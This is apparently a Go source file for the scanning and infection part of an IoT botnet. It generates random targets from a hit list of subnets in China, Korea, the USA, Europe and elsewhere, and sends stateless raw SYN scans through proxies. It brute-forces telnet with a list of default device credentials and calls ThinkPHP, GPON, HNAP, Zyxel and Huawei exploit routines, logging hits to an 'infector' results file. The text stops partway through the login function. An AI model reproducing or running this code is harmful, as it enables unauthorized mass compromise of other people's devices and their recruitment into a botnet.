package main

import (
	"bufio"
	crand "crypto/rand"
	"crypto/sha256"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
	"io"
	"log"
	"os/exec"
	"math/rand"
	"net"
	"os"
	"os/signal"
	"strconv"
	"strings"
	"sync/atomic"
	"syscall"
	"time"
)

var (
	scannedIPs        int64
	foundCreds        int64
	foundExps         int64
	passwordsTried    int64
	bruteSuccess      int64
	bruteFailed       int64
	startTime         = time.Now()
	proxyList         []string
	resultsFile       = "../infector/scan_results.txt"
	secretKey         = make([]byte, 32)
	c2Host            = "0.0.0.0"
)

var (
	hitListSubnets = []struct{ o1, o2 byte }{
		// China — high IoT density
		{1, 1}, {1, 192}, {1, 200}, {14, 135}, {14, 140}, {14, 141}, {14, 208},
		{27, 25}, {27, 26}, {36, 248}, {36, 249}, {36, 250}, {36, 251}, {36, 252}, {36, 253}, {36, 254}, {36, 255},
		{58, 0}, {58, 32}, {58, 60}, {58, 96}, {58, 97}, {58, 99}, {58, 140}, {58, 141},
		{58, 144}, {58, 148}, {58, 150}, {58, 154}, {58, 156}, {58, 160}, {58, 162},
		{58, 164}, {58, 165}, {58, 166}, {58, 167}, {58, 168}, {58, 169}, {58, 170},
		// Korea
		{110, 8}, {110, 9}, {110, 10}, {110, 11}, {110, 12}, {110, 13}, {110, 14}, {110, 15},
		{110, 16}, {110, 17}, {110, 18}, {110, 19}, {110, 20}, {111, 64}, {111, 128},
		{112, 0}, {112, 1}, {112, 16}, {112, 17}, {112, 32}, {112, 33}, {112, 48}, {112, 49},
		{114, 0}, {114, 1}, {114, 64}, {114, 65}, {114, 96}, {114, 97},
		{118, 0}, {118, 64}, {119, 0}, {119, 32}, {119, 96}, {119, 128},
		// Japan
		{113, 160}, {113, 161}, {113, 162}, {113, 163}, {113, 164}, {113, 165},
		{122, 0}, {122, 1}, {122, 16}, {122, 17}, {122, 32}, {122, 33},
		{126, 0}, {126, 1}, {126, 16}, {126, 17}, {126, 32}, {126, 33},
		// USA
		{23, 0}, {23, 1}, {23, 2}, {23, 3}, {23, 4}, {23, 5}, {23, 6}, {23, 7},
		{47, 0}, {47, 1}, {47, 2}, {47, 3}, {47, 4}, {47, 5}, {47, 6}, {47, 7},
		{65, 0}, {65, 128}, {66, 128}, {66, 192}, {67, 64}, {68, 0}, {68, 64},
		{69, 0}, {69, 60}, {69, 70}, {69, 160}, {69, 172}, {69, 174}, {69, 180},
		{70, 0}, {70, 32}, {71, 0}, {71, 4}, {72, 0}, {72, 22}, {73, 0}, {73, 16},
		{74, 0}, {74, 200}, {75, 0}, {75, 100}, {80, 0}, {80, 80}, {81, 0}, {81, 50},
		{82, 0}, {82, 208}, {83, 0}, {85, 0}, {85, 176}, {87, 0}, {88, 0}, {89, 0},
		// Europe
		{77, 0}, {77, 64}, {77, 128}, {77, 192}, {78, 0}, {78, 64}, {78, 128}, {78, 192},
		{79, 0}, {79, 64}, {79, 128}, {79, 192}, {80, 0}, {80, 64}, {80, 128}, {80, 192},
		{81, 0}, {81, 64}, {81, 128}, {81, 192}, {82, 0}, {82, 64}, {82, 128}, {82, 192},
		{83, 0}, {83, 64}, {83, 128}, {83, 192}, {84, 0}, {84, 64}, {84, 128}, {84, 192},
		{85, 0}, {85, 64}, {85, 128}, {85, 192}, {86, 0}, {86, 64}, {86, 128}, {86, 192},
		{87, 0}, {87, 64}, {87, 128}, {87, 192}, {88, 0}, {88, 64}, {88, 128}, {88, 192},
		{89, 0}, {89, 64}, {89, 128}, {89, 192}, {90, 0}, {90, 64}, {90, 128}, {90, 192},
		{91, 0}, {91, 64}, {91, 128}, {91, 192},
		// India
		{103, 4}, {103, 8}, {103, 16}, {103, 100}, {103, 101}, {103, 102},
		{104, 16}, {104, 24}, {104, 32}, {104, 48}, {104, 192},
		{107, 32}, {107, 64}, {107, 96}, {107, 128}, {107, 160}, {107, 192},
		{108, 0}, {108, 64}, {108, 128}, {108, 192},
		// Brazil
		{177, 0}, {177, 32}, {177, 64}, {177, 96}, {177, 128}, {177, 160}, {177, 192},
		{189, 0}, {189, 32}, {189, 64}, {189, 96}, {189, 128}, {189, 160}, {189, 192},
		// Russia
		{31, 184}, {31, 186}, {31, 187}, {31, 189}, {37, 77}, {37, 78},
		{37, 79}, {37, 81}, {37, 82}, {37, 83}, {37, 84}, {37, 86}, {37, 98},
		{37, 99}, {37, 102}, {37, 104}, {37, 106}, {37, 107}, {37, 112}, {37, 113},
		{37, 114}, {37, 115}, {37, 122}, {37, 123}, {37, 136}, {37, 137}, {37, 138},
		{37, 139}, {37, 141}, {37, 144}, {37, 146}, {37, 150}, {37, 168}, {37, 171},
		{37, 172}, {37, 173}, {37, 174}, {37, 175}, {37, 176},
	}

	lcgState          uint32
	proberSemaphore   = make(chan struct{}, 100)
	dialSemaphore     = make(chan struct{}, 500)
	resultQueue       = make(chan string, 10000)
)

type cred struct {
	username string
	password string
}

var weightedCreds = []cred{
	{"root", "root"}, {"admin", "admin"}, {"root", "12345"}, {"root", "1234"},
	{"root", "123456"}, {"root", "admin"}, {"root", "1234567890"}, {"root", "12345678"},
	{"root", "123456789"}, {"root", "password"}, {"root", "8888"}, {"root", "0000"},
	{"root", "1111"}, {"root", "111111"}, {"admin", "123456"}, {"admin", "1234"},
	{"admin", "password"}, {"admin", "admin1234"}, {"admin", "12345678"},
	{"root", "pass"}, {"root", "ubnt"}, {"root", "tplink"}, {"root", "netgear"},
	{"root", "vizio"}, {"root", "zte9x"}, {"root", "v202"}, {"root", "v22wat"},
	{"root", "CMMC"}, {"root", "CTWLAN"}, {"root", "telnet23"}, {"root", "changeme"},
	{"root", "abc123"}, {"root", "letmein"}, {"root", "welcome"}, {"root", "qwerty"},
	{"root", "password1234"}, {"root", "admin123"}, {"root", "default123"},
	{"root", "00000000"}, {"root", "0000000"}, {"root", "123456789a"},
	{"root", "pass1234"}, {"root", "1234567a"}, {"root", "12345a"},
	{"support", "support"}, {"user", "user"}, {"default", "default"},
	{"guest", "guest"}, {"ubnt", "ubnt"}, {"hi3518", "hi3518"}, {"bin", "bin"},
}

type ScanResult struct {
	IP   string
	Port int
	Type string
	Info string
}

type PcapCapture struct {
	handle     *pcap.Handle
	srcMAC     net.HardwareAddr
	gatewayMAC net.HardwareAddr
	localIP    net.IP
}

func promptInput(label string) string {
	reader := bufio.NewReader(os.Stdin)
	fmt.Print(label)
	input, _ := reader.ReadString('\n')
	return strings.TrimSpace(input)
}

func loadProxies(path string) []string {
	file, err := os.Open(path)
	if err != nil {
		return nil
	}
	defer file.Close()
	var proxies []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line == "" || strings.HasPrefix(line, "#") || strings.HasPrefix(line, "*") {
			continue
		}
		parts := strings.Split(line, ":")
		if len(parts) == 2 {
			if _, err := strconv.Atoi(parts[1]); err == nil {
				proxies = append(proxies, line)
			}
		}
	}
	return proxies
}

func socks5Dial(addr, target string) (net.Conn, error) {
	conn, err := net.DialTimeout("tcp", addr, 500*time.Millisecond)
	if err != nil {
		return nil, err
	}
	conn.SetReadDeadline(time.Now().Add(500 * time.Millisecond))
	conn.SetWriteDeadline(time.Now().Add(500 * time.Millisecond))
	if _, err := conn.Write([]byte{0x05, 0x01, 0x00}); err != nil {
		conn.Close()
		return nil, err
	}
	auth := make([]byte, 2)
	if _, err := io.ReadFull(conn, auth); err != nil {
		conn.Close()
		return nil, err
	}
	idx := strings.LastIndex(target, ":")
	targetHost, targetPortStr := target[:idx], target[idx+1:]
	targetPort, _ := strconv.Atoi(targetPortStr)
	req := []byte{0x05, 0x01, 0x00, 0x01}
	ipParts := strings.Split(targetHost, ".")
	for _, p := range ipParts {
		v, _ := strconv.Atoi(p)
		req = append(req, byte(v))
	}
	req = append(req, byte(targetPort>>8), byte(targetPort&0xFF))
	conn.Write(req)
	resp := make([]byte, 10)
	if _, err := io.ReadFull(conn, resp); err != nil {
		conn.Close()
		return nil, err
	}
	if resp[1] != 0x00 {
		conn.Close()
		return nil, fmt.Errorf("SOCKS5 failed: %02x", resp[1])
	}
	return conn, nil
}

func httpConnectDial(proxyAddr, target string) (net.Conn, error) {
	conn, err := net.DialTimeout("tcp", proxyAddr, 500*time.Millisecond)
	if err != nil {
		return nil, err
	}
	conn.SetReadDeadline(time.Now().Add(500 * time.Millisecond))
	conn.SetWriteDeadline(time.Now().Add(500 * time.Millisecond))
	req := fmt.Sprintf("CONNECT %s HTTP/1.1\r\nHost: %s\r\n\r\n", target, target)
	if _, err := conn.Write([]byte(req)); err != nil {
		conn.Close()
		return nil, err
	}
	resp := make([]byte, 256)
	n, err := conn.Read(resp)
	if err != nil {
		conn.Close()
		return nil, err
	}
	if !strings.Contains(string(resp[:n]), " 200 ") {
		conn.Close()
		return nil, fmt.Errorf("HTTP proxy failed")
	}
	return conn, nil
}

func proxyDial(target string) (net.Conn, error) {
	if len(proxyList) > 0 {
		proxy := proxyList[rand.Intn(len(proxyList))]
		conn, err := socks5Dial(proxy, target)
		if err != nil {
			conn, err = httpConnectDial(proxy, target)
			if err != nil {
				return net.DialTimeout("tcp", target, 500*time.Millisecond)
			}
			return conn, nil
		}
		return conn, nil
	}
	return net.DialTimeout("tcp", target, 500*time.Millisecond)
}

// proxyDialWithCleanup is a safe wrapper that ensures cleanup on error
func proxyDialWithCleanup(target string) (net.Conn, func()) {
	conn, err := proxyDial(target)
	if err != nil {
		return nil, func() {}
	}
	return conn, func() {
		if conn != nil {
			conn.Close()
		}
	}
}

// saveResult enqueues a result line for batch writing by the batchWriter goroutine
func saveResult(line string) {
	select {
	case resultQueue <- line:
	default:
		log.Printf("[FAST-SCANNER] Result queue full, dropping: %s", line)
	}
}

// batchWriter drains the resultQueue and writes batches to disk, avoiding per-hit file I/O
func batchWriter(stopChan chan struct{}) {
	f, err := os.OpenFile(resultsFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		log.Printf("[FAST-SCANNER] ERROR opening results file: %v", err)
		for range resultQueue {
		}
		return
	}
	defer f.Close()

	batch := make([]string, 0, 64)
	timer := time.NewTimer(500 * time.Millisecond)
	defer timer.Stop()

	flush := func() {
		if len(batch) == 0 {
			return
		}
		w := bufio.NewWriterSize(f, 65536)
		for _, l := range batch {
			w.WriteString(l)
			w.WriteString("\n")
		}
		w.Flush()
		f.Sync()
		batch = batch[:0]
	}

	for {
		select {
		case line, ok := <-resultQueue:
			if !ok {
				flush()
				return
			}
			batch = append(batch, line)
			if len(batch) >= 64 {
				flush()
				if !timer.Stop() {
					select {
					case <-timer.C:
					default:
					}
				}
				timer.Reset(500 * time.Millisecond)
			}
		case <-timer.C:
			flush()
			timer.Reset(500 * time.Millisecond)
		case <-stopChan:
			flush()
			return
		}
	}
}

// isBogon checks if an IP string is in a private/reserved/non-routable range
func isBogon(ip string) bool {
	parts := strings.Split(ip, ".")
	if len(parts) != 4 {
		return true
	}
	o1, err := strconv.Atoi(parts[0])
	if err != nil {
		return true
	}
	o2, _ := strconv.Atoi(parts[1])
	o3, _ := strconv.Atoi(parts[2])

	if o1 == 0 { return true }
	if o1 == 10 { return true }
	if o1 == 127 { return true }
	if o1 == 169 && o2 == 254 { return true }
	if o1 == 172 && o2 >= 16 && o2 <= 31 { return true }
	if o1 == 100 && o2 >= 64 && o2 <= 127 { return true }
	if o1 == 192 && o2 == 0 && o3 < 255 { return true }
	if o1 == 192 && o2 == 0 && o3 == 2 { return true }
	if o1 == 192 && o2 == 88 && o3 == 99 { return true }
	if o1 == 192 && o2 == 168 { return true }
	if o1 == 198 && o2 >= 18 && o2 <= 19 { return true }
	if o1 == 198 && o2 == 51 && o3 == 100 { return true }
	if o1 == 203 && o2 == 0 && o3 == 113 { return true }
	if o1 >= 224 { return true }
	return false
}

// lcgNext advances the LCG state atomically and returns the next pseudorandom value.
// Uses: X(n+1) = (a*X(n) + c) mod 2^32, a=1664525, c=1013904223
// Thread-safe via CAS loop — no mutex needed.
func lcgNext() uint32 {
	for {
		old := atomic.LoadUint32(&lcgState)
		new := old*1664525 + 1013904223
		if atomic.CompareAndSwapUint32(&lcgState, old, new) {
			return new
		}
	}
}

// isHoneypot checks if an IP is in a reserved/infrastructure range
// unlikely to host IoT devices (RIR allocations, monitoring, etc.)
func isHoneypot(ip string) bool {
	parts := strings.Split(ip, ".")
	if len(parts) != 4 {
		return true
	}
	o1, _ := strconv.Atoi(parts[0])

	// Reserved/RIR infrastructure ranges
	if o1 == 3 || o1 == 6 || o1 == 7 || o1 == 11 || o1 == 15 || o1 == 16 ||
		o1 == 21 || o1 == 22 || o1 == 26 || o1 == 28 || o1 == 30 || o1 == 33 ||
		o1 == 55 || o1 == 214 || o1 == 215 {
		return true
	}
	return false
}

// generateRandomIP produces pseudorandom IPs using an LCG over a density-optimized
// hit list of /16 subnets, with bogon + honeypot filtering as a safety net.
func generateRandomIP() string {
	for {
		idx := int(lcgNext() % uint32(len(hitListSubnets)))
		subnet := hitListSubnets[idx]
		host1 := byte(lcgNext() >> 24)
		host2 := byte(lcgNext() >> 24)
		ip := fmt.Sprintf("%d.%d.%d.%d", subnet.o1, subnet.o2, host1, host2)
		if !isBogon(ip) && !isHoneypot(ip) {
			return ip
		}
	}
}

// computeISN generates a deterministic 32-bit sequence number based on IP+port+secret.
// Uses SHA256 (truncated to 4 bytes) for strong collision resistance, preventing
// false-positive SYN-ACK matches from background internet noise.
func computeISN(ip net.IP, port uint16) uint32 {
	ip4 := ip.To4()
	h := sha256.New()
	h.Write(ip4)
	h.Write(secretKey)
	var portBuf [2]byte
	binary.BigEndian.PutUint16(portBuf[:], port)
	h.Write(portBuf[:])
	sum := h.Sum(nil)
	return binary.BigEndian.Uint32(sum[:4])
}

// openPcap opens a pcap handle via Npcap. On Windows, Npcap uses DLT_EN10MB
// (Ethernet), so we construct full Ethernet II frames for sending.
func openPcap() (*PcapCapture, error) {
	devices, err := pcap.FindAllDevs()
	if err != nil {
		return nil, fmt.Errorf("pcap find devices failed: %v", err)
	}

	srcMAC, localIP := getSourceMACAndIP()
	if srcMAC == nil {
		return nil, fmt.Errorf("could not determine source MAC address")
	}

	gatewayMAC, gwIP := getGatewayMACAndIP(localIP)
	if gatewayMAC == nil {
		log.Printf("[FAST-SCANNER] WARNING: Could not resolve gateway MAC, using broadcast")
		gatewayMAC = net.HardwareAddr{0xff, 0xff, 0xff, 0xff, 0xff, 0xff}
	}
	log.Printf("[FAST-SCANNER] Source MAC=%s, Local IP=%s, Gateway IP=%s, Gateway MAC=%s",
		srcMAC, localIP, gwIP, gatewayMAC)

	// Prefer the Npcap device that matches our discovered local IP
	for _, dev := range devices {
		nameLower := strings.ToLower(dev.Name)
		if strings.Contains(nameLower, "lo") || strings.Contains(nameLower, "loopback") {
			continue
		}
		// Check if this device has the same IP as our local IP
		for _, addr := range dev.Addresses {
			if addr.IP != nil && localIP != nil && addr.IP.Equal(localIP) && !addr.IP.IsLinkLocalUnicast() {
				handle, err := pcap.OpenLive(dev.Name, 65535, true, 100*time.Millisecond)
				if err != nil {
					continue
				}
				return &PcapCapture{
					handle:     handle,
					srcMAC:     srcMAC,
					gatewayMAC: gatewayMAC,
					localIP:    localIP,
				}, nil
			}
		}
	}
	// Fallback: any non-loopback device with a non-link-local IP
	for _, dev := range devices {
		nameLower := strings.ToLower(dev.Name)
		if strings.Contains(nameLower, "lo") || strings.Contains(nameLower, "loopback") {
			continue
		}
		for _, addr := range dev.Addresses {
			if addr.IP != nil && !addr.IP.IsLoopback() && !addr.IP.IsLinkLocalUnicast() {
				handle, err := pcap.OpenLive(dev.Name, 65535, true, 100*time.Millisecond)
				if err != nil {
					continue
				}
				return &PcapCapture{
					handle:     handle,
					srcMAC:     srcMAC,
					gatewayMAC: gatewayMAC,
					localIP:    localIP,
				}, nil
			}
		}
	}
	return nil, fmt.Errorf("pcap available but no suitable interface found")
}

// getSourceMACAndIP uses net.Interfaces() to find the source MAC and local IP
// of the primary non-loopback, non-virtual interface with a routable IPv4.
// This is locale-independent (no text parsing of ipconfig) unlike the old
// command-output parsing approach.
func getSourceMACAndIP() (net.HardwareAddr, net.IP) {
	ifaces, err := net.Interfaces()
	if err != nil {
		return nil, nil
	}
	for _, iface := range ifaces {
		if iface.Flags&net.FlagUp == 0 || iface.Flags&net.FlagLoopback != 0 {
			continue
		}
		if len(iface.HardwareAddr) != 6 {
			continue
		}
		// Skip virtual interface MAC prefixes
		mac := iface.HardwareAddr
		if isVirtualMAC(mac) {
			continue
		}
		addrs, err := iface.Addrs()
		if err != nil {
			continue
		}
		for _, addr := range addrs {
			if ipNet, ok := addr.(*net.IPNet); ok {
				ip4 := ipNet.IP.To4()
				if ip4 == nil || ip4.IsLoopback() || ip4.IsLinkLocalUnicast() {
					continue
				}
				return mac, ip4
			}
		}
	}
	return nil, nil
}

// isVirtualMAC checks if a MAC address belongs to a virtual interface
func isVirtualMAC(mac net.HardwareAddr) bool {
	if len(mac) < 3 {
		return false
	}
	// VMware: 00:50:56, 00:0C:29, 00:0C:20
	if mac[0] == 0x00 && mac[1] == 0x50 && mac[2] == 0x56 { return true }
	if mac[0] == 0x00 && mac[1] == 0x0C && mac[2] == 0x29 { return true }
	if mac[0] == 0x00 && mac[1] == 0x0C && mac[2] == 0x20 { return true }
	// VirtualBox: 08:00:0C (older), 0A:00:27 (newer)
	if mac[0] == 0x08 && mac[1] == 0x00 && mac[2] == 0x0C { return true }
	if mac[0] == 0x0A && mac[1] == 0x00 && mac[2] == 0x27 { return true }
	// Hyper-V / WSL: 00:15:5D
	if mac[0] == 0x00 && mac[1] == 0x15 && mac[2] == 0x5D { return true }
	// Docker bridge: 02:42:AC (common), but also 02:42:xx:xx:xx:xx
	if mac[0] == 0x02 && mac[1] == 0x42 { return true }
	// Common virtual prefix: 02:00:
	if mac[0] == 0x02 && mac[1] == 0x00 { return true }
	// Parallels: 00:1C:42
	if mac[0] == 0x00 && mac[1] == 0x1C && mac[2] == 0x42 { return true }
	return false
}

// getGatewayMACAndIP resolves the default gateway IP and its MAC address.
// Uses `route PRINT` + `arp -a`; works on Windows. On Linux uses `ip route`.
func getGatewayMACAndIP(localIP net.IP) (net.HardwareAddr, string) {
	gatewayIP := ""

	// Try `route PRINT` (Windows) or `ip route` (Linux)
	if out, err := exec.Command("route", "PRINT", "0.0.0.0").Output(); err == nil {
		lines := strings.Split(string(out), "\n")
		for _, line := range lines {
			fields := strings.Fields(line)
			if len(fields) >= 4 && fields[0] == "0.0.0.0" && fields[1] == "0.0.0.0" &&
				strings.Contains(line, "On-link") == false {
				gatewayIP = fields[2]
				break
			}
		}
	}

	if gatewayIP == "" {
		// Fallback: parse ipconfig for "Default Gateway"
		if out, err := exec.Command("ipconfig").Output(); err == nil {
			lines := strings.Split(string(out), "\n")
			for i, line := range lines {
				if strings.Contains(line, "Default Gateway") {
					if i+2 < len(lines) {
						fields := strings.SplitN(strings.TrimSpace(lines[i+2]), ":", 2)
						if len(fields) == 2 {
							gatewayIP = strings.TrimSpace(fields[1])
						}
					}
				}
			}
		}
	}

	if gatewayIP == "" {
		return nil, ""
	}

	// Ping gateway to populate ARP cache
	exec.Command("ping", "-n", "1", "-w", "500", gatewayIP).Run()

	// Get gateway MAC from ARP table
	if out, err := exec.Command("arp", "-a", gatewayIP).Output(); err == nil {
		lines := strings.Split(string(out), "\n")
		for _, line := range lines {
			if strings.Contains(line, gatewayIP) {
				fields := strings.Fields(line)
				for _, f := range fields {
					if strings.Count(f, "-") == 5 {
						return parseWindowsMAC(f), gatewayIP
					}
				}
			}
		}
	}

	return nil, gatewayIP
}

// parseWindowsMAC parses a Windows-style MAC address (e.g. "aa-bb-cc-dd-ee-ff")
func parseWindowsMAC(s string) net.HardwareAddr {
	parts := strings.Split(s, "-")
	if len(parts) != 6 {
		return nil
	}
	mac := make(net.HardwareAddr, 6)
	for i, p := range parts {
		v, err := strconv.ParseUint(p, 16, 8)
		if err != nil {
			return nil
		}
		mac[i] = byte(v)
	}
	return mac
}

func (p *PcapCapture) Close() {
	p.handle.Close()
}

func (p *PcapCapture) LinkType() layers.LinkType {
	return p.handle.LinkType()
}

func (p *PcapCapture) WritePacketData(data []byte) error {
	return p.handle.WritePacketData(data)
}

// sendRawSYN sends a raw TCP SYN with cookie-encoded ISN for stateless tracking.
// Constructs a full Ethernet II frame (14-byte header) + IPv4 + TCP with options.
func sendRawSYN(p *PcapCapture, dstIP net.IP, dstPort uint16) {
	isn := computeISN(dstIP, dstPort)

	eth := layers.Ethernet{
		SrcMAC:       p.srcMAC,
		DstMAC:       p.gatewayMAC,
		EthernetType: layers.EthernetTypeIPv4,
	}

	ip := layers.IPv4{
		Version:  4,
		IHL:      5,
		TTL:      64,
		Protocol: layers.IPProtocolTCP,
		SrcIP:    p.localIP,
		DstIP:    dstIP.To4(),
	}

	tcp := layers.TCP{
		SrcPort: layers.TCPPort(rand.Intn(60000) + 1024),
		DstPort: layers.TCPPort(dstPort),
		Seq:     isn,
		Ack:     0,
		SYN:     true,
		Window:  64000,
	}
	tcp.Options = []layers.TCPOption{
		{
			OptionType:   layers.TCPOptionKindMSS,
			OptionLength: 4,
			OptionData:   []byte{0x05, 0xB4},
		},
		{
			OptionType:   layers.TCPOptionKindSACKPermitted,
			OptionLength: 2,
		},
	}

	buf := gopacket.NewSerializeBuffer()
	err := gopacket.SerializeLayers(buf, gopacket.SerializeOptions{
		FixLengths:       true,
		ComputeChecksums: true,
	}, &eth, &ip, &tcp)
	if err != nil {
		return
	}

	p.WritePacketData(buf.Bytes())
}

// scannerWorker sends raw SYN packets continuously (transmit-only, no tracking)
func scannerWorker(stopChan chan struct{}, foundChan chan<- string, rawActive *int32, p *PcapCapture) {
	for {
		select {
		case <-stopChan:
			return
		default:
		}
		if atomic.LoadInt32(rawActive) == 0 {
			return
		}
		ip := generateRandomIP()
		atomic.AddInt64(&scannedIPs, 1)
		ipParsed := net.ParseIP(ip)

		for _, port := range []uint16{23, 2323, 80, 8080, 37215} {
			sendRawSYN(p, ipParsed, port)
		}
		time.Sleep(200 * time.Millisecond)
	}
}

// synReceiver listens for SYN-ACK responses using gopacket's zero-copy
// DecodingLayerParser for maximum throughput, and verifies cookies statelessly.
func synReceiver(p *PcapCapture, foundChan chan<- string, stopChan chan struct{}) {
	var eth layers.Ethernet
	var ip4 layers.IPv4
	var tcp layers.TCP
	var decoded []gopacket.LayerType

	parser := gopacket.NewDecodingLayerParser(layers.LayerTypeEthernet, &eth, &ip4, &tcp)
	parser.IgnoreUnsupported = true

	for {
		select {
		case <-stopChan:
			return
		default:
		}

		data, _, err := p.handle.ReadPacketData()
		if err != nil || len(data) < 14 {
			continue
		}

		// Zero-copy decode — no heap allocations
		// io.EOF is not a failure: it signals the parser reached the end of
		// all decodable layers (Ethernet -> IPv4 -> TCP), which is expected.
		err = parser.DecodeLayers(data, &decoded)
		if err != nil && err != io.EOF {
			continue
		}

		// Require both IP and TCP layers
		hasIP := false
		hasTCP := false
		for _, lt := range decoded {
			if lt == layers.LayerTypeIPv4 {
				hasIP = true
			}
			if lt == layers.LayerTypeTCP {
				hasTCP = true
			}
		}
		if !hasIP || !hasTCP {
			continue
		}

		// Accept SYN-ACK, allowing ECE/CWR flags (only reject RST)
		if !tcp.SYN || !tcp.ACK || tcp.RST {
			continue
		}

		srcIP := ip4.SrcIP
		srcPort := uint16(tcp.SrcPort)

		// Verify cookie: SYN-ACK ACK = original ISN + 1
		expectedISN := computeISN(srcIP, srcPort)
		if tcp.Ack != expectedISN+1 {
			continue
		}

		foundChan <- fmt.Sprintf("%s:%d:OPEN", srcIP.String(), srcPort)
	}
}

func handleOpenPort(ip string, port int) {
	fmt.Printf("[SCANNER] HIT >> %s:%d (SYN-ACK verified)\n", ip, port)
	probeOpenPort(ip, port)
}

func handleResult(result ScanResult) {
	switch result.Type {
	case "creds":
		fmt.Printf("[SCANNER] FOUND >> %s:%d %s:%s\n", result.IP, result.Port, result.Info, "")
		saveResult(fmt.Sprintf("%s:%d:%s", result.IP, result.Port, result.Info))
		atomic.AddInt64(&foundCreds, 1)
	case "exploit":
		fmt.Printf("[SCANNER] EXPLOIT >> %s:%d %s\n", result.IP, result.Port, result.Info)
		saveResult(fmt.Sprintf("%s:%d:%s", result.IP, result.Port, result.Info))
		atomic.AddInt64(&foundExps, 1)
	case "open":
		// Bounded worker pool: acquire semaphore before spawning prober
		proberSemaphore <- struct{}{}
		go func(ip string, port int) {
			defer func() { <-proberSemaphore }()
			probeOpenPort(ip, port)
		}(result.IP, result.Port)
	}
}

// handleRawResult processes string results from SYN-ACK receiver
func handleRawResult(result string) {
	if strings.HasSuffix(result, ":OPEN") {
		parts := strings.Split(strings.TrimSuffix(result, ":OPEN"), ":")
		if len(parts) == 2 {
			port, err := strconv.Atoi(parts[1])
			if err == nil {
				// Bounded worker pool: acquire semaphore before spawning prober
				proberSemaphore <- struct{}{}
				go func(ip string, port int) {
					defer func() { <-proberSemaphore }()
					handleOpenPort(ip, port)
				}(parts[0], port)
			}
		}
	}
}

func probeOpenPort(ip string, port int) {
	switch port {
	case 23, 2323:
		for _, c := range weightedCreds {
			atomic.AddInt64(&passwordsTried, 1)
			if tryLogin(ip, port, c.username, c.password) {
				fmt.Printf("[SCANNER] FOUND >> %s:%d %s:%s\n", ip, port, c.username, c.password)
				saveResult(fmt.Sprintf("%s:%d:%s:%s", ip, port, c.username, c.password))
				atomic.AddInt64(&foundCreds, 1)
				atomic.AddInt64(&bruteSuccess, 1)
				return
			}
			atomic.AddInt64(&bruteFailed, 1)
		}
	case 80:
		if rand.Intn(100) < 30 {
			if tryThinkPHPExploit(ip) {
				saveResult(fmt.Sprintf("%s:80:thinkphp", ip))
				atomic.AddInt64(&foundExps, 1)
			}
		}
		if rand.Intn(100) < 30 {
			if tryGpon80Exploit(ip) {
				saveResult(fmt.Sprintf("%s:80:gpon80", ip))
				atomic.AddInt64(&foundExps, 1)
			}
		}
		if rand.Intn(100) < 30 {
			if tryHnapExploit(ip) {
				saveResult(fmt.Sprintf("%s:80:hnap", ip))
				atomic.AddInt64(&foundExps, 1)
			}
		}
	case 8080:
		if rand.Intn(100) < 50 {
			if tryZyxelExploit(ip) {
				saveResult(fmt.Sprintf("%s:8080:zyxel", ip))
				atomic.AddInt64(&foundExps, 1)
			}
		}
	case 37215:
		if rand.Intn(100) < 50 {
			if tryHuaweiExploit(ip) {
				saveResult(fmt.Sprintf("%s:37215:huawei", ip))
				atomic.AddInt64(&foundExps, 1)
			}
		}
	}
}

func scannerWorkerConnect(stopChan chan struct{}, rawActive *int32, scanResultChan chan<- ScanResult) {
	ports := []int{23, 2323, 80, 8080, 37215}
	// Per-worker semaphore limits concurrent dials to 2 (2000 workers × 2 = 4000 max)
	for {
		select {
		case <-stopChan:
			return
		default:
		}
		ip := generateRandomIP()
		atomic.AddInt64(&scannedIPs, 1)

		// Sequential per-worker scan, with global dial semaphore
		for _, port := range ports {
			dialSemaphore <- struct{}{}
			if isPortOpen(ip, port) {
				<-dialSemaphore
				scanResultChan <- ScanResult{IP: ip, Port: port, Type: "open"}
			} else {
				<-dialSemaphore
			}
		}
	}
}

func isPortOpen(ip string, port int) bool {
	addr := net.JoinHostPort(ip, strconv.Itoa(port))
	conn, err := net.DialTimeout("tcp", addr, 150*time.Millisecond)
	if err != nil {
		return false
	}
	conn.Close()
	return true
}

func consumeIACs(conn net.Conn) (string, bool) {
	buf := make([]byte, 256)
	n, err := conn.Read(buf)
	if err != nil {
		return "", false
	}
	data := buf[:n]
	result := make([]byte, 0, len(data))
	i := 0
	for i < len(data) {
		if data[i] == 0xff && i+1 < len(data) {
			cmd := data[i+1]
			if cmd == 0xfb || cmd == 0xfc || cmd == 0xfd || cmd == 0xfe {
				if i+2 < len(data) {
					i += 3
				} else {
					i += 2
				}
				continue
			}
			if cmd == 0xff {
				i += 2
				continue
			}
		}
		result = append(result, data[i])
		i++
	}
	return string(result), true
}

func isLoginPrompt(text string) bool {
	tl := strings.ToLower(text)
	return strings.Contains(tl, "login:") || strings.Contains(tl, "username:") || strings.Contains(tl, "user:") || strings.Contains(tl, "ogin:")
}

func isAuthFailure(text string) bool {
	tl := strings.ToLower(text)
	return strings.Contains(tl, "incorrect") || strings.Contains(tl, "failed") || strings.Contains(tl, "denied") || strings.Contains(tl, "invalid") || strings.Contains(tl, "wrong") || strings.Contains(tl, "bad")
}

func isAuthSuccess(text string) bool {
	tl := strings.ToLower(text)
	return strings.Contains(tl, "#") || strings.Contains(tl, "$") || strings.Contains(tl, ">") || strings.Contains(tl, "busybox") || strings.Contains(tl, "welcome") || strings.Contains(tl, "shell") || strings.Contains(tl, "sh:")
}

func tryLogin(targetIP string, port int, username, password string) bool {
	addr := fmt.Sprintf("%s:%d", targetIP, port)
	conn, err := proxyDial(addr)
	if err != nil {
		return false
	}
	defer conn.Close()

	conn.SetReadDeadline(time.Now().Add(500 * time.Millisecond))
	banner, ok := consumeIACs(conn)
	if !ok {
		banner = ""
	}
	if banner != "" && !isLoginPrompt(banner) {
		conn.Write([]byte("\r\n"))
		time.Sleep(200 * time.Millisecond)
		conn.SetReadDeadline(time.Now().Add(500 * time.Millisecond))
		banner, _ = consumeIACs(conn)
	}
	if banner == "" || !isLoginPrompt(banner) {
		return false
	}

	conn.SetWriteDeadline(time.Now().Add(500 * time.Millisecond))
	conn.Write([]byte(username + "\r\n"))
	time.Sleep(100 * time.Millisecond)
	conn.Write([]byte(password + "\r\n"))
	time.Sleep(200 * time.Millisecond)

	conn.SetReadDeadline(time.Now().Add(500 * time.Millisecond))
	resp, ok := consumeIACs(conn)
	if !ok {
		return false
	}
